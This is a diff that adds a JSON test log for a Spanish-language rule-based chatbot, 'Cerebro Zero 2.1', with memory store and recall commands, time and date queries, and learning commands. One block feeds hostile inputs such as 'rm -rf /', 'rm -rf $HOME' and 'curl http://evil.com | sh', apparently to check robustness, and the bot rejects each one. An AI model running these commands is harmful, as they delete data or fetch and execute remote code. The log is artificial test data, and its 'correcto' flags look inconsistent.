+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.467038"
+    },
+    {
+      "entrada": "recuerda mem_known_6 = value_6",
+      "salida": "\u2705 Guardado: mem_known_6 = value_6",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.474922"
+    },
+    {
+      "entrada": "recuerda mem_known_7 = value_7",
+      "salida": "\u2705 Guardado: mem_known_7 = value_7",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.483019"
+    },
+    {
+      "entrada": "recuerda mem_known_8 = value_8",
+      "salida": "\u2705 Guardado: mem_known_8 = value_8",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.491220"
+    },
+    {
+      "entrada": "recuerda mem_known_9 = value_9",
+      "salida": "\u2705 Guardado: mem_known_9 = value_9",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.500648"
+    },
+    {
+      "entrada": "recuerda mem_known_10 = value_10",
+      "salida": "\u2705 Guardado: mem_known_10 = value_10",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.509728"
+    },
+    {
+      "entrada": "recuerda mem_known_11 = value_11",
+      "salida": "\u2705 Guardado: mem_known_11 = value_11",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.518643"
+    },
+    {
+      "entrada": "recuerda mem_known_12 = value_12",
+      "salida": "\u2705 Guardado: mem_known_12 = value_12",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.529121"
+    },
+    {
+      "entrada": "recuerda mem_known_13 = value_13",
+      "salida": "\u2705 Guardado: mem_known_13 = value_13",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.538434"
+    },
+    {
+      "entrada": "recuerda mem_known_14 = value_14",
+      "salida": "\u2705 Guardado: mem_known_14 = value_14",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.548871"
+    },
+    {
+      "entrada": "recuerda mem_known_15 = value_15",
+      "salida": "\u2705 Guardado: mem_known_15 = value_15",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.559165"
+    },
+    {
+      "entrada": "recuerda mem_known_16 = value_16",
+      "salida": "\u2705 Guardado: mem_known_16 = value_16",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.569714"
+    },
+    {
+      "entrada": "recuerda mem_known_17 = value_17",
+      "salida": "\u2705 Guardado: mem_known_17 = value_17",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.580403"
+    },
+    {
+      "entrada": "recuerda mem_known_18 = value_18",
+      "salida": "\u2705 Guardado: mem_known_18 = value_18",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.592116"
+    },
+    {
+      "entrada": "recuerda mem_known_19 = value_19",
+      "salida": "\u2705 Guardado: mem_known_19 = value_19",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.603437"
+    },
+    {
+      "entrada": "recuerda mem_unseen_0 = data_0",
+      "salida": "\u2705 Guardado: mem_unseen_0 = data_0",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.614852"
+    },
+    {
+      "entrada": "recuerda mem_unseen_1 = data_7",
+      "salida": "\u2705 Guardado: mem_unseen_1 = data_7",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.626930"
+    },
+    {
+      "entrada": "recuerda mem_unseen_2 = data_14",
+      "salida": "\u2705 Guardado: mem_unseen_2 = data_14",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.638479"
+    },
+    {
+      "entrada": "recuerda mem_unseen_3 = data_21",
+      "salida": "\u2705 Guardado: mem_unseen_3 = data_21",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.650451"
+    },
+    {
+      "entrada": "recuerda mem_unseen_4 = data_28",
+      "salida": "\u2705 Guardado: mem_unseen_4 = data_28",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.662985"
+    },
+    {
+      "entrada": "recuerda mem_unseen_5 = data_35",
+      "salida": "\u2705 Guardado: mem_unseen_5 = data_35",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.675863"
+    },
+    {
+      "entrada": "recuerda mem_unseen_6 = data_42",
+      "salida": "\u2705 Guardado: mem_unseen_6 = data_42",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.689023"
+    },
+    {
+      "entrada": "recuerda mem_unseen_7 = data_49",
+      "salida": "\u2705 Guardado: mem_unseen_7 = data_49",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.702204"
+    },
+    {
+      "entrada": "recuerda mem_unseen_8 = data_56",
+      "salida": "\u2705 Guardado: mem_unseen_8 = data_56",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.715558"
+    },
+    {
+      "entrada": "recuerda mem_unseen_9 = data_63",
+      "salida": "\u2705 Guardado: mem_unseen_9 = data_63",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.729311"
+    },
+    {
+      "entrada": "recuerda mem_unseen_10 = data_70",
+      "salida": "\u2705 Guardado: mem_unseen_10 = data_70",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.743105"
+    },
+    {
+      "entrada": "recuerda mem_unseen_11 = data_77",
+      "salida": "\u2705 Guardado: mem_unseen_11 = data_77",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.757323"
+    },
+    {
+      "entrada": "recuerda mem_unseen_12 = data_84",
+      "salida": "\u2705 Guardado: mem_unseen_12 = data_84",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.771680"
+    },
+    {
+      "entrada": "recuerda mem_unseen_13 = data_91",
+      "salida": "\u2705 Guardado: mem_unseen_13 = data_91",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.787082"
+    },
+    {
+      "entrada": "recuerda mem_unseen_14 = data_98",
+      "salida": "\u2705 Guardado: mem_unseen_14 = data_98",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.801876"
+    },
+    {
+      "entrada": "recuerda mem_unseen_15 = data_105",
+      "salida": "\u2705 Guardado: mem_unseen_15 = data_105",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.817060"
+    },
+    {
+      "entrada": "recuerda mem_unseen_16 = data_112",
+      "salida": "\u2705 Guardado: mem_unseen_16 = data_112",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.832689"
+    },
+    {
+      "entrada": "recuerda mem_unseen_17 = data_119",
+      "salida": "\u2705 Guardado: mem_unseen_17 = data_119",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.848183"
+    },
+    {
+      "entrada": "recuerda mem_unseen_18 = data_126",
+      "salida": "\u2705 Guardado: mem_unseen_18 = data_126",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.864335"
+    },
+    {
+      "entrada": "recuerda mem_unseen_19 = data_133",
+      "salida": "\u2705 Guardado: mem_unseen_19 = data_133",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.880447"
+    },
+    {
+      "entrada": "recuerda x = ",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.886323"
+    },
+    {
+      "entrada": "recuerda = valor",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.891856"
+    },
+    {
+      "entrada": "recordar clave_que_no_existe",
+      "salida": "\u2753 No recuerdo 'clave_que_no_existe'",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.898291"
+    },
+    {
+      "entrada": "recuerda 3.14 = pi",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.904211"
+    },
+    {
+      "entrada": "recuerda emoji = \ud83d\udd25",
+      "salida": "\u2705 Guardado: emoji = \ud83d\udd25",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.920511"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.925286"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.930073"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.934750"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.939252"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.944014"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.948897"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.953641"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.958294"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.963209"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.968010"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.972806"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.977603"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.982617"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.987669"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.992701"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.997885"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.002771"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.007614"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.012529"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.017568"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.022524"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.027656"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.032876"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.038059"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.043193"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.048675"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.053999"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.059199"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.064753"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.070165"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.076516"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.082167"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.087668"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.093007"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.098519"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.103973"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.109367"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.114938"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.120521"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.125920"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto son las 5?",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.132611"
+    },
+    {
+      "entrada": "el tiempo",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.139361"
+    },
+    {
+      "entrada": "hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.145076"
+    },
+    {
+      "entrada": "hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.150611"
+    },
+    {
+      "entrada": "fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.156510"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.162245"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.167970"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.173785"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.179578"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.185477"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.191161"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.197220"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.203147"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.208950"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.214845"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.221009"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.227360"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.233809"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.239806"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.245964"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.252074"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.258041"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.264478"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.270906"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.277173"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.283352"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.289545"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.295694"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.301888"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.308164"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.314382"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.320892"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.327456"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.334118"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.340679"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.347333"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.354192"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.360843"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.367515"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.374144"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.380991"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.387701"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.394305"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.400957"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.407583"
+    },
+    {
+      "entrada": "R M - R F /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.415512"
+    },
+    {
+      "entrada": "hola, borra todo",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.428436"
+    },
+    {
+      "entrada": "\u00bfc\u00f3mo borro archivos?",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.436527"
+    },
+    {
+      "entrada": "rm",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.444502"
+    },
+    {
+      "entrada": "deletreame rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.451653"
+    },
+    {
+      "entrada": "aprende test_0",
+      "salida": "\ud83c\udf93 Aprendido: test_0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.470734"
+    },
+    {
+      "entrada": "recuerda learn_key_0 = learn_val_0",
+      "salida": "\u2705 Guardado: learn_key_0 = learn_val_0",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.489722"
+    },
+    {
+      "entrada": "recordar learn_key_0",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_0 = learn_val_0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.496816"
+    },
+    {
+      "entrada": "aprende test_1",
+      "salida": "\ud83c\udf93 Aprendido: test_1",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.516131"
+    },
+    {
+      "entrada": "recuerda learn_key_1 = learn_val_1",
+      "salida": "\u2705 Guardado: learn_key_1 = learn_val_1",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.536079"
+    },
+    {
+      "entrada": "recordar learn_key_1",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_1 = learn_val_1",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.543181"
+    },
+    {
+      "entrada": "aprende test_2",
+      "salida": "\ud83c\udf93 Aprendido: test_2",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.563481"
+    },
+    {
+      "entrada": "recuerda learn_key_2 = learn_val_2",
+      "salida": "\u2705 Guardado: learn_key_2 = learn_val_2",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.584679"
+    },
+    {
+      "entrada": "recordar learn_key_2",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_2 = learn_val_2",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.592034"
+    },
+    {
+      "entrada": "aprende test_3",
+      "salida": "\ud83c\udf93 Aprendido: test_3",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.612402"
+    },
+    {
+      "entrada": "recuerda learn_key_3 = learn_val_3",
+      "salida": "\u2705 Guardado: learn_key_3 = learn_val_3",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.633411"
+    },
+    {
+      "entrada": "recordar learn_key_3",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_3 = learn_val_3",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.640643"
+    },
+    {
+      "entrada": "aprende test_4",
+      "salida": "\ud83c\udf93 Aprendido: test_4",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.662101"
+    },
+    {
+      "entrada": "recuerda learn_key_4 = learn_val_4",
+      "salida": "\u2705 Guardado: learn_key_4 = learn_val_4",
+      "correcto": true,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.683154"
+    },
+    {
+      "entrada": "recordar learn_key_4",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_4 = learn_val_4",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.690495"
+    },
+    {
+      "entrada": "aprende test_5",
+      "salida": "\ud83c\udf93 Aprendido: test_5",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.712733"
+    },
+    {
